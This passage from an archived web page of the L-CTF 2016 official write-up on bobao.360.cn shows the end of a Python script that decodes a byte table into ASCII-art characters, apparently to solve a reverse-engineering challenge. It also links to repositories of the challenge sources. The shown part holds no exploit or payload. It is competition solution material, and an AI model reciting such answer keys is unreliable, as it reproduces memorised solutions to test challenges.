value">0x46</code><code class="python plain">,&nbsp;</code><code class="python value">0x11</code><code class="python plain">,&nbsp;</code><code class="python value">0x11</code><code class="python plain">,&nbsp;</code><code class="python value">0x11</code><code class="python plain">,&nbsp;</code><code class="python value">0x17</code><code class="python plain">,&nbsp;</code><code class="python value">0x51</code><code class="python plain">,&nbsp;</code><code class="python value">0x46</code><code class="python plain">,&nbsp;</code><code class="python value">0x41</code><code class="python plain">],&nbsp;</code></div><div class="line number58 index57 alt1"><code class="python value">0xCB</code><code class="python plain">:[</code><code class="python value">0x00</code><code class="python plain">,&nbsp;</code><code class="python value">0x00</code><code class="python plain">,&nbsp;</code><code class="python value">0x00</code><code class="python plain">,&nbsp;</code><code class="python value">0x17</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x42</code><code class="python plain">,&nbsp;</code><code class="python value">0x44</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">],&nbsp;</code></div><div class="line number59 index58 alt2"><code class="python value">0xCC</code><code class="python plain">:[</code><code class="python value">0x53</code><code class="python plain">,&nbsp;</code><code class="python value">0x42</code><code class="python plain">,&nbsp;</code><code class="python value">0x42</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x42</code><code class="python plain">,&nbsp;</code><code class="python value">0x42</code><code class="python plain">,&nbsp;</code><code class="python value">0x53</code><code class="python plain">],&nbsp;</code></div><div class="line number60 index59 alt1"><code class="python value">0xCD</code><code class="python plain">:[</code><code class="python value">0x57</code><code class="python plain">,&nbsp;</code><code class="python value">0x50</code><code class="python plain">,&nbsp;</code><code class="python value">0x40</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x02</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x57</code><code class="python plain">],&nbsp;</code></div><div class="line number61 index60 alt2"><code class="python value">0xCE</code><code class="python plain">:[</code><code class="python value">0x15</code><code class="python plain">,&nbsp;</code><code class="python value">0x15</code><code class="python plain">,&nbsp;</code><code class="python value">0x15</code><code class="python plain">,&nbsp;</code><code class="python value">0x46</code><code class="python plain">,&nbsp;</code><code class="python value">0x42</code><code class="python plain">,&nbsp;</code><code class="python value">0x42</code><code class="python plain">,&nbsp;</code><code class="python value">0x42</code><code class="python plain">,&nbsp;</code><code class="python value">0x42</code><code class="python plain">],&nbsp;</code></div><div class="line number62 index61 alt1"><code class="python value">0xCF</code><code class="python plain">:[</code><code class="python value">0x00</code><code class="python plain">,&nbsp;</code><code class="python value">0x45</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x44</code><code class="python plain">,&nbsp;</code><code class="python value">0x02</code><code class="python plain">,&nbsp;</code><code class="python value">0x47</code><code class="python plain">,&nbsp;</code><code class="python value">0x02</code><code class="python plain">,&nbsp;</code><code class="python value">0x45</code><code class="python plain">],&nbsp;</code></div><div class="line number63 index62 alt2"><code class="python value">0xC0</code><code class="python plain">:[</code><code class="python value">0x00</code><code class="python plain">,&nbsp;</code><code class="python value">0x00</code><code class="python plain">,&nbsp;</code><code class="python value">0x00</code><code class="python plain">,&nbsp;</code><code class="python value">0x56</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x17</code><code class="python plain">],&nbsp;</code></div><div class="line number64 index63 alt1"><code class="python value">0xC1</code><code class="python plain">:[</code><code class="python value">0x41</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x47</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x47</code><code class="python plain">],&nbsp;</code></div><div class="line number65 index64 alt2"><code class="python value">0xC2</code><code class="python plain">:[</code><code class="python value">0x57</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x42</code><code class="python plain">,&nbsp;</code><code class="python value">0x46</code><code class="python plain">,&nbsp;</code><code class="python value">0x42</code><code class="python plain">,&nbsp;</code><code class="python value">0x02</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x57</code><code class="python plain">],&nbsp;</code></div><div class="line number66 index65 alt1"><code class="python value">0xC7</code><code class="python plain">:[</code><code class="python value">0x41</code><code class="python plain">,&nbsp;</code><code class="python value">0x01</code><code class="python plain">,&nbsp;</code><code class="python value">0x01</code><code class="python plain">,&nbsp;</code><code class="python value">0x45</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x45</code><code class="python plain">],&nbsp;</code></div><div class="line number67 index66 alt2"><code class="python value">0xE3</code><code class="python plain">:[</code><code class="python value">0x41</code><code class="python plain">,&nbsp;</code><code class="python value">0x40</code><code class="python plain">,&nbsp;</code><code class="python value">0x40</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x40</code><code class="python plain">,&nbsp;</code><code class="python value">0x40</code><code class="python plain">,&nbsp;</code><code class="python value">0x40</code><code class="python plain">,&nbsp;</code><code class="python value">0x41</code><code class="python plain">],&nbsp;</code></div><div class="line number68 index67 alt1"><code class="python value">0xE5</code><code class="python plain">:[</code><code class="python value">0x06</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x40</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x06</code><code class="python plain">]</code></div><div class="line number69 index68 alt2"><code class="python plain">}</code></div><div class="line number70 index69 alt1"><code class="python keyword">for</code>&nbsp;<code class="python plain">i&nbsp;</code><code class="python keyword">in</code>&nbsp;<code class="python plain">srctext:</code></div><div class="line number71 index70 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">c&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python functions">list</code><code class="python plain">(charmap[</code><code class="python value">0x98</code><code class="python plain">^</code><code class="python functions">ord</code><code class="python plain">(i)])</code></div><div class="line number72 index71 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">c&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">[</code><code class="python value">0</code><code class="python plain">]</code><code class="python keyword">*</code><code class="python plain">(</code><code class="python value">8</code><code class="python keyword">-</code><code class="python functions">len</code><code class="python plain">(c))</code><code class="python keyword">+</code><code class="python plain">c</code></div><div class="line number73 index72 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">for</code>&nbsp;<code class="python plain">r&nbsp;</code><code class="python keyword">in</code>&nbsp;<code class="python plain">c:</code></div><div class="line number74 index73 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code>&nbsp;<code class="python functions">type</code><code class="python plain">(r)</code><code class="python keyword">=</code><code class="python keyword">=</code><code class="python functions">str</code><code class="python plain">:</code></div><div class="line number75 index74 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">r&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python functions">ord</code><code class="python plain">(r)</code></div><div class="line number76 index75 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#&nbsp;swap&nbsp;the&nbsp;io&nbsp;line</code></div><div class="line number77 index76 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">r</code><code class="python keyword">=</code><code class="python plain">((r&amp;</code><code class="python value">0b00000001</code><code class="python plain">))&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|((r&amp;</code><code class="python value">0b00000010</code><code class="python plain">)&lt;&lt;</code><code class="python value">2</code><code class="python plain">)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|((r&amp;</code><code class="python value">0b00000100</code><code class="python plain">))&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|((r&amp;</code><code class="python value">0b00001000</code><code class="python plain">)&gt;&gt;</code><code class="python value">3</code><code class="python plain">)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|((r&amp;</code><code class="python value">0b00010000</code><code class="python plain">))&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|((r&amp;</code><code class="python value">0b00100000</code><code class="python plain">))&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|((r&amp;</code><code class="python value">0b01000000</code><code class="python plain">)&gt;&gt;</code><code class="python value">5</code><code class="python plain">)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|((r&amp;</code><code class="python value">0b10000000</code><code class="python plain">))</code></div><div class="line number78 index77 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#&nbsp;convert&nbsp;to&nbsp;graph</code></div><div class="line number79 index78 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">r&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python functions">bin</code><code class="python plain">(r)[</code><code class="python value">2</code><code class="python plain">:]</code></div><div class="line number80 index79 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">r&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python string">'0'</code><code class="python keyword">*</code><code class="python plain">(</code><code class="python value">8</code><code class="python keyword">-</code><code class="python functions">len</code><code class="python plain">(r))</code><code class="python keyword">+</code><code class="python plain">r</code></div><div class="line number81 index80 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">r&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">r.replace(</code><code class="python string">'0'</code><code class="python plain">,</code><code class="python string">'&nbsp;'</code><code class="python plain">)</code></div><div class="line number82 index81 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">r&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">r.replace(</code><code class="python string">'1'</code><code class="python plain">,</code><code class="python string">'\x18'</code><code class="python plain">)</code></div><div class="line number83 index82 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">print</code><code class="python plain">(r)</code></div><div class="line number84 index83 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">input</code><code class="python plain">()</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><br></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Attachments</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></strong></span></p><hr><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">1. Pwn出题人给出的源码：<a href="https://github.com/Ic3makr/pwnable-solutions/tree/master/L-ctf-2016" _src="https://github.com/Ic3makr/pwnable-solutions/tree/master/L-ctf-2016">https://github.com/Ic3makr/pwnable-solutions/tree/master/L-ctf-2016</a></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">2. Re400、500的源码：<a href="https://github.com/SilverBut/2016CM" _src="https://github.com/SilverBut/2016CM">https://github.com/SilverBut/2016CM</a></span></p><p></p>
                        <p>本文由 安全客 原创发布，如需转载请注明来源及本文地址。<br>本文地址：http://bobao.360.cn/ctf/detail/170.html</p>
                      </div>
          <div class="mt40"><div style="margin-top: 20px;background-color:#FFFFFF">
    <input type="hidden" id="detail_title" name="detail_title" value="【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体">
    <input type="hidden" id="use_nickname" name="use_nickname" value="0">
    <a name="mao"></a>
    <div class="reg-log mobile-hiden">
        <div class="" id="userTo">   
            <div id="to-list" class="input-text" style="">
                <textarea disabled="disabled" class="hide" id="comment-content" to="to"></textarea>
                <ul id="preadded" style="display:none">       
                </ul>
                <div id="to-auto" style="width: 200px">
                    <ul id="feed">
                    </ul>
                </div>
            </div>
        </div>
        <input type="hidden" id="source-id" value="170">
        <input type="hidden" id="source-type" value="ctf">
        <input type="hidden" id="post-comment-url" value="/comment/add">
        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax">
        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin">
        <input type="hidden" id="stoken_comment_set" value="217a46c7c0c9f91e94e6bcb1482423bd">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
            </div>
    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0">

        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
    </div>


    <div class="clearfix"></div>
    <div class="comments">
        <div class="comments-head">
            <span class="title">用户评论</span>
        </div>
                <div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/4x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="4340" user-name="大表嫂" href="javascript:;">
                大表嫂            </a>
                        <span class="comment-time">2016-10-08 15:08:08</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="4340">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;" class="good" data-target="/comment/good" data-value="g_4340" data-type="comment">点赞(0)</a></span>
            </div>
        </div>

        <p class="content">学习了，要消化好久</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>

        <a class="more-long comment-more" href="javascript:;" data-target="/comment/more" data-type="ctf" data-source-id="170" data-page="2">查看更多</a>
            </div>
</div>
<script>
    $(function () {
        $('.anonymous-comment').click(function () {
            $(".join").hide();
            $(".reg-log textarea").first().removeAttr("disabled").show();
            $('#use_nickname').val('1');
//            $('#trigger-nickname').attr('checked', true);
            $('#trigger-nickname').trigger('click');
        });
        //为所有复选框绑定事件
//        checkbox_on_click();
        //ajax随机获取昵称
//        randnicknameajax(0);
        //ajax检测登录状态
//        comment_check_login();
    });



    function input_checkbox(flag) {
        $('input:checkbox').each(function () {
            var value = flag ? 1 : 0;
            $(this).prop('checked', flag);
            $(this).val(value);
        });
    }

//ajax随机获取昵称
    function randnicknameajax(flag) {
        $.ajax({
            type: 'POST',
            url: $('#post-nickname-url-ajax').val(),
            data: {limit: 1, flag: flag},
            dataType: "json",
            success: function (data) {
                $('#nick-name').val(data.data[0]);
                _nick_name=data.data[0];
            }
        });
    }
//ajax检测登录状态
    function comment_check_login() {
        $.ajax({
            type: 'POST',
            url: $('#post-check-login-url-ajax').val(),
            data: {},
            dataType: "json",
            success: function (data) {
                if (data.success) {
                    $('.join').hide();
                    $(".reg-log textarea").first().removeAttr("disabled").show();
                    $("#span_use_nickname").show();
                    $('#use_nickname').val('0');
                    $('#use_nickname').attr('checked', false);
                }
            }
        });
    }
</script></div>
      </div>
  </div>
  <div class="side-bar">
      <div class="mod hot-news">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
    </div>
    <ul class="links-list">
                                <li><a href="http://bobao.360.cn/learning/detail/3078.html" alt="【技术分享】一探小米Analytics后门 " target="_blank">【技术分享】一探小米Analyti...</a></li>
                                <li><a href="http://bobao.360.cn/learning/detail/3079.html" alt="【技术分享】Dlink DWR-932B路由器被爆多个安全漏洞" target="_blank">【技术分享】Dlink DWR-932...</a></li>
                                <li><a href="http://bobao.360.cn/learning/detail/3080.html" alt="【技术分享】海康威视网络摄像机远程访问发现XXE漏洞" target="_blank">【技术分享】海康威视网络摄像机远程...</a></li>
                                <li><a href="http://bobao.360.cn/learning/detail/3081.html" alt="【技术分享】几张图让你理解：Tor是如何工作的" target="_blank">【技术分享】几张图让你理解：Tor...</a></li>
            </ul>
</div>      <!-- 友情链接 -->
	  <div class="mod blog-links mobile-hide">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
        <a href="http://bobao.360.cn/links/index.html" class="more">更多<i></i></a>
    </div>
        <ul class="links-list">
                <li><a href="http://bbs.360safe.com/" alt="360安全社区" target="_blank">360安全社区</a></li>
                <li><a href="http://zhuji.360.cn/" alt="360主机卫士" target="_blank">360主机卫士</a></li>
                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
                <li><a href="http://www.ichunqiu.com/" alt="i春秋学院-信息安全体验中心" target="_blank">i春秋学院-信息安全体验中心</a></li>
            </ul>
    </div>
      <!-- 联系我们 -->
      <div class="mod contact mobile-hide" style="text-align:center">
    <div class="head-bar clearfix">
        <h2><i></i><span>关注我们</span></h2>
    </div>
    <!-- 微信关注 -->
    <ul class="contact-way">
        <li><a>微信关注</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/qrcode_adlab_weixin.png" width="145px" height="145px;">
    </div>
    
    <!-- APP下载 -->
    <ul class="contact-way">
        <li><a>安全播报APP</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/scan_code_big.png" width="145px" height="145px;">
    </div>
    
</div>

  </div>
</div>

<script type="text/javascript" src="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/jquery-ui.min.js"></script>
<script type="text/javascript" src="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/jquery.noty.packaged.min.js"></script>
<script type="text/javascript" src="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/common.js"></script>
<script>$(function() {sync_count('comment');});</script>


<!-- 语法高亮 -->
<script type="text/javascript" src="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/shCore.js"></script>
<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
    </div>

	    <div class="footer">
        <div class="friend-link">
            <a href="http://www.360.cn/" target="_blank">360首页</a>
            <span>|</span>
            <a href="http://bobao.360.cn/introduce/index" target="_blank">关于我们</a>
            <span>|</span>
            <a href="http://bobao.360.cn/introduce/index" target="_blank">联系我们</a>
            <span>|</span>
            <a href="http://bobao.360.cn/links/index.html" target="_blank">友情链接</a>
            <span>|</span>
            <a href="http://bobao.360.cn/introduce/index" target="_blank">招贤纳士</a>
        </div>
        <div class="copy">
        Copyright © 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
        </div>
    </div>
        
</div>

<!--奇舞团统计-->
<script src="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/8e133f74.js"></script>
<script>
    monitor.setProject('360_bobao_pc').getTrack().getClickAndKeydown();
</script>

<div class="hide">
<script src="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/z_stat.php" language="JavaScript"></script><script src="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/core.php" charset="utf-8" type="text/javascript"></script><a href="http://www.cnzz.com/stat/website.php?web_id=1253147824" target="_blank" title="站长统计">站长统计</a>
</div>
    <div class="backToTop_wrap off">
        <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
    </div>
    <script>
        var $backToTop_wrap = $(".backToTop_wrap"),
            $backToTop_btn  = $("#back_to_top");
    
        if($(window).scrollTop() > 100) {
            $backToTop_wrap.removeClass("off");
        }
        else {
            $backToTop_wrap.addClass("off");
        }
    
        $(window).on("scroll", function(){
            if($(this).scrollTop() > 100) {
                $backToTop_wrap.removeClass("off");
            }
            else {
                $backToTop_wrap.addClass("off");
            }
        });
    
        $backToTop_btn.on("click", function(){
            $("html, body").animate({ scrollTop: 0 }, 120);
        });
        
        $(function(){
            var navlist = $('.nav-list > li');
            
            navlist.each(function(){
                $(this).on('mouseenter', function(){
                    $(this).addClass('selected');
                });
                
                $(this).on('mouseleave', function(){
                    $(this).removeClass('selected');
                });
            });
        })
    </script>





</body></html>